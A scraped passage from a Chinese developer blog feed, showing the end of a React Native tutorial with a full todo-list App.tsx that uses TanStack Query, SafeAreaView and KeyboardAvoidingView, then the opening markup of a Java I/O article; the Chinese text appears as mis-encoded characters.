<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SafeAreaProvider</span>&gt;</span>
      {/* edges æ§åˆ¶åªä¿æŠ¤é¡¶éƒ¨ã€å·¦ä¾§å’Œå³ä¾§ï¼Œåº•éƒ¨ç•™ç»™è¾“å…¥æ¡†è‡ªå·±å¤„ç† */}
      <span class="hljs-tag">&lt;<span class="hljs-name">SafeAreaView</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.container}</span> <span class="hljs-attr">edges</span>=<span class="hljs-string">{[</span>'<span class="hljs-attr">top</span>', '<span class="hljs-attr">left</span>', '<span class="hljs-attr">right</span>']}&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.header}</span>&gt;</span>RN + React Query å¾…åŠæ¸…å•<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Todos</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">SafeAreaView</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">SafeAreaProvider</span>&gt;</span></span>
  );
}
</code></pre>
<ul>
<li><strong>æœ€ä½³å®è·µ</strong>ï¼š<code>SafeAreaProvider</code> å¿…é¡»æ”¾åœ¨æœ€é¡¶å±‚ï¼Œè€Œ <code>SafeAreaView</code> åˆ™åŒ…è£¹å…·ä½“çš„é¡µé¢å†…å®¹ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-7">3. äº¤äº’ä¼˜åŒ–ï¼šé”®ç›˜é¿è®©æŒ‡å—</h3>
<p>è¾“å…¥æ¡†åœ¨å±å¹•åº•éƒ¨æ—¶ï¼Œæœ€å¤§çš„ç—›ç‚¹å°±æ˜¯<strong>é”®ç›˜å¼¹å‡ºåä¼šé®æŒ¡è¾“å…¥æ¡†</strong>ã€‚æˆ‘ä»¬ä½¿ç”¨ <code>KeyboardAvoidingView</code> æ¥ä¼˜é›…è§£å†³ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript">&lt;<span class="hljs-title class_">KeyboardAvoidingView</span>
  style={styles.<span class="hljs-property">content</span>}
  <span class="hljs-comment">// iOS å’Œ Android çš„å¤„ç†æœºåˆ¶ä¸åŒï¼Œéœ€è¦åˆ†åˆ«è®¾ç½®</span>
  behavior={<span class="hljs-title class_">Platform</span>.<span class="hljs-property">OS</span> === <span class="hljs-string">'ios'</span> ? <span class="hljs-string">'padding'</span> : <span class="hljs-string">'height'</span>}
  <span class="hljs-comment">// è¿™é‡Œçš„ offset ç”¨äºå¾®è°ƒï¼Œé˜²æ­¢é”®ç›˜ç´§è´´è¾“å…¥æ¡†</span>
  keyboardVerticalOffset={<span class="hljs-title class_">Platform</span>.<span class="hljs-property">OS</span> === <span class="hljs-string">'ios'</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">20</span>}
&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">FlatList</span> 
    /* <span class="hljs-attr">...åˆ—è¡¨å†…å®¹...</span> */ 
    // <span class="hljs-attr">å…³é”®å±æ€§</span>ï¼š<span class="hljs-attr">ç‚¹å‡»åˆ—è¡¨ç©ºç™½å¤„æ”¶èµ·é”®ç›˜</span>
    <span class="hljs-attr">keyboardShouldPersistTaps</span>=<span class="hljs-string">"handled"</span>
  /&gt;</span></span>
  
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.inputContainer}</span>&gt;</span>
    {/* è¾“å…¥æ¡†å’ŒæŒ‰é’® */}
  <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">KeyboardAvoidingView</span>&gt;
</code></pre>
<hr/>
<h2 data-id="heading-8">å®Œæ•´ä»£ç å®ç°</h2>
<p>ä½ å¯ä»¥ç›´æ¥å°†ä»¥ä¸‹ä»£ç å¤åˆ¶åˆ°ä½ çš„ <code>App.tsx</code> ä¸­è¿è¡Œï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ActivityIndicator</span>,
  <span class="hljs-title class_">Alert</span>,
  <span class="hljs-title class_">FlatList</span>,
  <span class="hljs-title class_">KeyboardAvoidingView</span>,
  <span class="hljs-title class_">Platform</span>,
  <span class="hljs-title class_">StyleSheet</span>,
  <span class="hljs-title class_">Text</span>,
  <span class="hljs-title class_">TextInput</span>,
  <span class="hljs-title class_">TouchableOpacity</span>,
  <span class="hljs-title class_">View</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native'</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">QueryClient</span>,
  <span class="hljs-title class_">QueryClientProvider</span>,
  useMutation,
  useQuery,
  useQueryClient,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@tanstack/react-query'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">SafeAreaProvider</span>, <span class="hljs-title class_">SafeAreaView</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native-safe-area-context'</span>;

<span class="hljs-comment">// --- 1. ç±»å‹å®šä¹‰ &amp; æ¨¡æ‹Ÿ API ---</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-attr">mockTodos</span>: <span class="hljs-title class_">Todo</span>[] = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'å­¦ä¹  React Native'</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'é›†æˆ TanStack Query'</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">true</span> },
];

<span class="hljs-keyword">const</span> <span class="hljs-title function_">wait</span> = (<span class="hljs-params">ms: <span class="hljs-built_in">number</span></span>) =&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));

<span class="hljs-keyword">const</span> getTodos = <span class="hljs-keyword">async</span> (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Todo</span>[]&gt; =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">wait</span>(<span class="hljs-number">1000</span>); <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ</span>
  <span class="hljs-keyword">return</span> [...mockTodos];
};

<span class="hljs-keyword">const</span> postTodo = <span class="hljs-keyword">async</span> (<span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Todo</span>&gt; =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">wait</span>(<span class="hljs-number">1000</span>);
  <span class="hljs-keyword">if</span> (!title.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'å†…å®¹ä¸èƒ½ä¸ºç©º'</span>);
  <span class="hljs-keyword">const</span> newTodo = { <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(), title, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> };
  mockTodos.<span class="hljs-title function_">push</span>(newTodo);
  <span class="hljs-keyword">return</span> newTodo;
};

<span class="hljs-comment">// --- 2. åˆå§‹åŒ– Client ---</span>
<span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>();

<span class="hljs-comment">// --- 3. æ ¹ç»„ä»¶ ---</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">QueryClientProvider</span> <span class="hljs-attr">client</span>=<span class="hljs-string">{queryClient}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">SafeAreaProvider</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">SafeAreaView</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.container}</span> <span class="hljs-attr">edges</span>=<span class="hljs-string">{[</span>'<span class="hljs-attr">top</span>', '<span class="hljs-attr">left</span>', '<span class="hljs-attr">right</span>']}&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.header}</span>&gt;</span>RN + React Query å¾…åŠæ¸…å•<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Todos</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">SafeAreaView</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">SafeAreaProvider</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">QueryClientProvider</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// --- 4. ä¸šåŠ¡ç»„ä»¶ ---</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Todos</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> queryClient = <span class="hljs-title function_">useQueryClient</span>();
  <span class="hljs-keyword">const</span> [text, setText] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);

  <span class="hljs-comment">// 4.1 è¯»å–æ•°æ®</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: todos, isLoading, isError, error } = <span class="hljs-title function_">useQuery</span>({
    <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>],
    <span class="hljs-attr">queryFn</span>: getTodos,
  });

  <span class="hljs-comment">// 4.2 ä¿®æ”¹æ•°æ®</span>
  <span class="hljs-keyword">const</span> mutation = <span class="hljs-title function_">useMutation</span>({
    <span class="hljs-attr">mutationFn</span>: postTodo,
    <span class="hljs-attr">onSuccess</span>: <span class="hljs-function">() =&gt;</span> {
      queryClient.<span class="hljs-title function_">invalidateQueries</span>({ <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>] });
      <span class="hljs-title function_">setText</span>(<span class="hljs-string">''</span>);
    },
    <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
      <span class="hljs-title class_">Alert</span>.<span class="hljs-title function_">alert</span>(<span class="hljs-string">'é”™è¯¯'</span>, <span class="hljs-string">`æ·»åŠ å¤±è´¥: <span class="hljs-subst">${err}</span>`</span>);
    },
  });

  <span class="hljs-keyword">if</span> (isLoading) {
    <span class="hljs-keyword">return</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.center}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ActivityIndicator</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"large"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"#0000ff"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">marginTop:</span> <span class="hljs-attr">10</span> }}&gt;</span>æ­£åœ¨åŠ è½½ä»»åŠ¡...<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span></span>
    );
  }

  <span class="hljs-keyword">if</span> (isError) {
    <span class="hljs-keyword">return</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.center}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.errorText}</span>&gt;</span>åŠ è½½å¤±è´¥: {error.message}<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span></span>
    );
  }

  <span class="hljs-comment">// 4.3 æ¸²æŸ“ UI</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">KeyboardAvoidingView</span>
      <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.content}</span>
      <span class="hljs-attr">behavior</span>=<span class="hljs-string">{Platform.OS</span> === <span class="hljs-string">'ios'</span> ? '<span class="hljs-attr">padding</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">height</span>'}
      <span class="hljs-attr">keyboardVerticalOffset</span>=<span class="hljs-string">{Platform.OS</span> === <span class="hljs-string">'ios'</span> ? <span class="hljs-attr">0</span> <span class="hljs-attr">:</span> <span class="hljs-attr">20</span>}
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">FlatList</span>
        <span class="hljs-attr">data</span>=<span class="hljs-string">{todos}</span>
        <span class="hljs-attr">keyExtractor</span>=<span class="hljs-string">{(item)</span> =&gt;</span> item.id.toString()}
        renderItem={({ item }) =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.item}</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{[styles.itemText,</span> <span class="hljs-attr">item.completed</span> &amp;&amp; <span class="hljs-attr">styles.completedText</span>]}&gt;</span>
              {item.title}
            <span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span>
        )}
        ListEmptyComponent={<span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.emptyText}</span>&gt;</span>æš‚æ— ä»»åŠ¡<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>}
        contentContainerStyle={styles.listContent}
        keyboardShouldPersistTaps="handled"
      /&gt;

      <span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.inputContainer}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">TextInput</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.input}</span>
          <span class="hljs-attr">value</span>=<span class="hljs-string">{text}</span>
          <span class="hljs-attr">onChangeText</span>=<span class="hljs-string">{setText}</span>
          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¾“å…¥æ–°ä»»åŠ¡..."</span>
          <span class="hljs-attr">editable</span>=<span class="hljs-string">{!mutation.isPending}</span>
        /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">TouchableOpacity</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{[styles.button,</span> <span class="hljs-attr">mutation.isPending</span> &amp;&amp; <span class="hljs-attr">styles.buttonDisabled</span>]}
          <span class="hljs-attr">onPress</span>=<span class="hljs-string">{()</span> =&gt;</span> mutation.mutate(text)}
          disabled={mutation.isPending}
        &gt;
          {mutation.isPending ? (
            <span class="hljs-tag">&lt;<span class="hljs-name">ActivityIndicator</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"#fff"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span> /&gt;</span>
          ) : (
            <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.buttonText}</span>&gt;</span>æ·»åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
          )}
        <span class="hljs-tag">&lt;/<span class="hljs-name">TouchableOpacity</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">KeyboardAvoidingView</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// --- 5. æ ·å¼è¡¨ ---</span>
<span class="hljs-keyword">const</span> styles = <span class="hljs-title class_">StyleSheet</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">container</span>: { <span class="hljs-attr">flex</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#f5f5f5'</span> },
  <span class="hljs-attr">header</span>: { <span class="hljs-attr">fontSize</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'bold'</span>, <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">marginVertical</span>: <span class="hljs-number">20</span> },
  <span class="hljs-attr">content</span>: { <span class="hljs-attr">flex</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">paddingHorizontal</span>: <span class="hljs-number">20</span> },
  <span class="hljs-attr">listContent</span>: { <span class="hljs-attr">flexGrow</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">paddingBottom</span>: <span class="hljs-number">10</span> },
  <span class="hljs-attr">center</span>: { <span class="hljs-attr">flex</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">justifyContent</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">alignItems</span>: <span class="hljs-string">'center'</span> },
  <span class="hljs-attr">errorText</span>: { <span class="hljs-attr">color</span>: <span class="hljs-string">'red'</span>, <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span> },
  <span class="hljs-attr">item</span>: { <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attr">padding</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">borderRadius</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">marginBottom</span>: <span class="hljs-number">10</span> },
  <span class="hljs-attr">itemText</span>: { <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span> },
  <span class="hljs-attr">completedText</span>: { <span class="hljs-attr">textDecorationLine</span>: <span class="hljs-string">'line-through'</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#999'</span> },
  <span class="hljs-attr">emptyText</span>: { <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#999'</span>, <span class="hljs-attr">marginTop</span>: <span class="hljs-number">20</span> },
  <span class="hljs-attr">inputContainer</span>: { <span class="hljs-attr">flexDirection</span>: <span class="hljs-string">'row'</span>, <span class="hljs-attr">marginBottom</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">marginTop</span>: <span class="hljs-number">10</span> },
  <span class="hljs-attr">input</span>: { <span class="hljs-attr">flex</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attr">padding</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">borderRadius</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">marginRight</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">borderWidth</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#ddd'</span> },
  <span class="hljs-attr">button</span>: { <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#007AFF'</span>, <span class="hljs-attr">justifyContent</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">paddingHorizontal</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">borderRadius</span>: <span class="hljs-number">8</span> },
  <span class="hljs-attr">buttonDisabled</span>: { <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#A0C4FF'</span> },
  <span class="hljs-attr">buttonText</span>: { <span class="hljs-attr">color</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'bold'</span> },
});
</code></pre>
<hr/>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>è¿™æ®µä»£ç è™½ç„¶çŸ­å°ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªéå¸¸æ ‡å‡†çš„ React Native <strong>â€œå·¥ä¸šçº§â€</strong> å†™æ³•ã€‚</p>
<ol>
<li><strong>æ‹’ç»è£¸å¥”çš„ View</strong>ï¼šæ°¸è¿œè®°å¾—ç”¨ <code>SafeAreaView</code> ä¿æŠ¤ä½ çš„å†…å®¹ã€‚</li>
<li><strong>æ‹’ç»ç¹ççš„çŠ¶æ€</strong>ï¼šç”¨ React Query è®©æ•°æ®æµå˜å¾—æ¸…æ™°ã€è‡ªåŠ¨ã€‚</li>
<li><strong>æ‹’ç»è¢«é®æŒ¡çš„è¾“å…¥æ¡†</strong>ï¼šç”¨ <code>KeyboardAvoidingView</code> ç»™ç”¨æˆ·æœ€å¥½çš„è¾“å…¥ä½“éªŒã€‚</li>
</ol>
<p>æŒæ¡äº†è¿™ä¸‰ç‚¹ï¼Œä½ å°±æŒæ¡äº†æ„å»ºé«˜è´¨é‡ç§»åŠ¨åº”ç”¨çš„åŸºç¡€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java I/O æµä¸æ–‡ä»¶æ“ä½œå®Œå…¨æŒ‡å—ï¼šä»åŸºç¡€åˆ°ç°ä»£å®è·µ]]></title>    <link>https://juejin.cn/post/7582163781184372742</link>    <guid>https://juejin.cn/post/7582163781184372742</guid>    <pubDate>2025-12-11T07:28:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582163781184372742" data-draft-id="7582207260199354422" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java I/O æµä¸æ–‡ä»¶æ“ä½œå®Œå…¨æŒ‡å—ï¼šä»åŸºç¡€åˆ°ç°ä»£å®è·µ"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-11T07:28:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java I/O æµä¸æ–‡ä»¶æ“ä½œå®Œå…¨æŒ‡å—ï¼šä»åŸºç¡€åˆ°ç°ä»£å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:28:27.000Z" title="Thu Dec 11 2025 07:28:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAACCgAwAEAAAAAQAAACAAAAAAX7wP8AAAAAlwSFlzAAALEwAACxMBAJqcGAAAAVlpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KGV7hBwAABWVJREFUWAnlVktsVFUY/s85997pC9BOTKxRWnEKsXWlxjWJj0RWJjrFAAXjAlewYWOkgauACVu7a2IiNUEyExM3yoZE3Wmi7qgPJthJBDE6JUNpO3Mf5/j95/bOTOcBlBgXejJ37rn/Of/7O/9/iP7vQ/zTAcjnC4ry+a5ii1OkiYTpuvjvEc0Gp51uivP+ZW+QBuSW4QjW5rptAa1Ey0uOGKOxwPetVyafN6p/52/PkNBbjdAhGaGEpMRjLZTryB8+9MUSYSGNRIcBvm8kBAY9tHYlHz78nTs392xIkwv9FA3Oe33bdoX1ZZKOS0bH0CXI6RugYLW6BwIu5gskkQ4sEG0wYF25PjBzbZfSYY6kDLUmWMt7FR7Lw3xY